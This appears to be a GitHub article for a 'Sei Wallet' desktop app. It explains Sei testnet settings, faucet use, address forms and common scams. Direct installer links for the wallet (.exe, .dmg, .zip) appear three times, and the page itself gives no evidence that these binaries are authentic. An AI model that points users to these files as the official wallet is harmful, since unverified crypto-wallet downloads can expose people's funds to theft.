![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Sei testnet, the faucet and test coins in Sei Wallet</h1>

<p align="center">Run the testnet beside mainnet and get test coins without risking real SEI.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Sei's testnet is a separate network with its own chain ID, its own validators and its own tokens. It exists so you can deploy, sign and break things without risking money. Test SEI has no value, cannot be moved to mainnet, and is not a preview of your mainnet balance.

The practical work is small: point a wallet at chain 1328, get test coins from the faucet, and use a testnet explorer to see what happened. The mistakes are also small, and they waste an afternoon each.

## The settings

| Field | Testnet |
|---|---|
| Chain ID | 1328 |
| Network name | `atlantic-2` |
| Currency | SEI (test tokens, no value) |
| Explorer | the testnet explorer named in Sei's docs |

Take the RPC URL and explorer from Sei's documentation rather than from a list, because they change and a wrong endpoint produces the confusing middle state where the wallet connects and nothing works.

The mainnet values are 1329 and `pacific-1`; mixing the two is the most common setup error, and [the app's network switch](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) is where you choose which one you are reading.

## What the faucet is for

A faucet dispenses a small amount of test currency, usually with a limit per address or per period. It exists because you cannot buy test tokens, and because deploying or exercising contracts needs gas.

Three things it is not:

- **Not a source of value.** Test SEI cannot be sold, bridged to mainnet, or converted.
- **Not a promise.** Faucets run out, rate-limit, or require an account. A failure is usually a limit rather than a bug.
- **Not automatic.** You paste an address and request; nothing arrives without that step.

If a faucet asks for a private key or a seed phrase, it is not a faucet. It only ever needs an address.

## Setting up, in order

1. **Add or switch to the testnet network** in the wallet, using chain 1328 and the documented RPC.
2. **Copy the testnet address.** It is the same `0x…` address as mainnet — an address is not network-specific — but confirm you are on the testnet before assuming a balance.
3. **Request test tokens** from the faucet, pasting that address.
4. **Confirm the balance** in the wallet, then in the testnet explorer. If the explorer shows it and the wallet does not, the wallet's endpoint is lagging.
5. **Make one small transaction** to confirm signing works, before you try anything elaborate.

Step 4 is worth doing every time: the testnet is where you learn that a wallet's display and the chain's state are two different things, and [a testnet explorer](https://github.com/sei-chain/sei-wallet-staking/blob/main/read-a-block-explorer.md) is how you see the difference.

## Why balances look wrong on testnet

Because an EVM address is the same on every chain, the classic confusion is sharper here than anywhere:

- **The same address holds different balances on 1329 and 1328.** A mainnet wallet does not show testnet funds, and vice versa.
- **A mainnet explorer will not find a testnet transaction.** It will report nothing, correctly.
- **Test tokens cannot be sent to mainnet.** There is no route; they are a different asset on a different network.

If your balance is missing, confirm the network before doing anything else — it is the cheapest check in this whole set.

## The address-form question on testnet

Sei's dual address system applies on the testnet too: one key, a `0x…` and a `sei1…` form, linked by an association. A testnet balance under the Cosmos-side form may be invisible in an EVM-only view.

That matters when you are testing address handling, because the behaviour you are testing is the behaviour you will meet on mainnet. [The two forms on testnet](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) applies unchanged.

## For developers, briefly

If you are deploying rather than just transacting:

- **The EVM is compatible**, with documented differences — no blob transactions, no ENS, fees to validators. [Why EVM compatibility matters](https://github.com/sei-chain/sei-wallet-setup/blob/main/evm-compatibility-explained.md) covers what carries over.
- **Testnet state is disposable.** A reset or a new testnet wipes balances and contracts; do not treat it as a staging environment with uptime promises.
- **Gas is still gas.** A contract that runs out of gas on testnet will do the same on mainnet, so run the failure cases deliberately.
- **A stuck testnet transaction** is usually a fee or nonce issue, and [a transaction that will not confirm](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) covers it — the mechanics are identical to mainnet.

## What to keep separate

- **Do not import a mainnet seed into a tool you found while testing.** The phrase is the account on every network; a "testnet helper" that wants it is a scam with a smaller prize.
- **Do not bridge real funds to test.** There is no bridge to a testnet, and an offer to do it is nonsense.
- **Do not reuse testnet keys for real value.** Generate a separate account; the cost is one phrase, and it keeps the blast radius at zero.

## When the faucet will not cooperate

In rough order: a per-address limit already reached, a balance above the faucet's threshold (some refuse if you already hold enough), a captcha or account requirement, or a faucet that is simply out of funds.

What you can do: wait out the limit, try the faucet named in Sei's documentation rather than a copy, or ask in the developer channels. What you should not do: pay for test tokens. They have no value, so anyone selling them is selling nothing — and the "payment" is usually a signature that costs you real funds elsewhere.

## Frequently asked questions

**Is there a Sei testnet faucet?** Yes, named in Sei's documentation. It dispenses test tokens for chain 1328, with limits.

**Is testnet SEI worth anything?** No. It cannot be transferred to mainnet or sold.

**Will my address be the same on testnet?** The `0x…` address is the same because it comes from the key; the balance is per network. The `sei1…` form exists there too.

**Why does the faucet refuse my address?** Most often a limit, an existing balance above the threshold, or an account requirement. It never needs a private key.

**Can I use MetaMask for testnet?** Yes, by adding chain 1328 as a separate network entry. [MetaMask on testnet](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) is the same five fields with different values.

**Where do I see testnet transactions?** A testnet explorer. A mainnet explorer will show nothing, and that is accurate rather than a failure.

**Can I move test tokens to mainnet?** No. There is no path, and any site claiming one is a scam.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Reading a Sei block explorer beside Sei Wallet activity](https://github.com/sei-chain/sei-wallet-staking/blob/main/read-a-block-explorer.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Is Sei EVM compatible, and what that means for Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/evm-compatibility-explained.md)
